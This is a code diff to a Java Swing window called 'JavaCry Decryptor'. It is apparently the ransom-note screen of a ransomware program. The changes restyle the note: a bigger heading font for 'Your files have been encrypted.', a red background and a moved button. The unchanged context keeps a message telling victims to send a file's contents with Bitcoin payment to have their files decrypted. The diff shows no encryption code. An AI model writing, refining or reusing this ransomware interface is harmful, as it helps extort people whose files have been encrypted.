@@ -1,6 +1,7 @@
 import java.awt.*;
 import javax.swing.*;
 import java.awt.event.*;
+import java.awt.Color;
 
 import java.util.*;
 import java.net.*;
@@ -58,7 +59,7 @@ public Decryptor() {
         String note = String.join("\n"
                                   , "<html>"
                                   , ""
-                                  , "<h1>Your files have been encrypted.</h1>"
+                                  , "<h1 style = 'font-size: 32px;font-family: Lucida Console;'>Your files have been encrypted.</h1>"
                                   , "<p>"
                                   , "Your files have been encrypted. If you want to decrypt your files, please copy the content of sendtome.txt send it with $1 BTC to address. You can generate the transaction output with <address>https://btcmessage.com/</address>, and copy it to your BTC wallet to send me your money. I will check the payments before I approve your request for decryption."
                                   , "</p>"
@@ -74,8 +75,8 @@ public Decryptor() {
         JPanel panel = new JPanel(new FlowLayout());
         JLabel html = new JLabel(note, JLabel.LEFT);
 
-        // creating a Button
         JButton b = new JButton("Request for Decryption");
+
         JLabel status = new JLabel("");
         b.addActionListener(new ActionListener() {
 
@@ -140,26 +141,22 @@ public Decryptor() {
                 });
 
 
-        // setting position of above components in the frame
-        b.setBounds(100, 200, 200, 30);
+        b.setBounds(30, 200, 200, 50);
         status.setBounds(100, 300, 400, 30);
         panel.setLayout(new FlowLayout());
 
-        // adding components into frame
+        f.setBackground(Color.RED);
         f.add(b);
         f.add(status);
 
         panel.add(html);
         f.getContentPane().add(panel);
 
-        // frame size 300 width and 300 height
         f.setSize(1200,600);
 
-        // setting the title of frame
         f.setTitle("JavaCry Decryptor");
         f.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
 
-        // setting visibility of frame
         f.setVisible(true);
 }
 
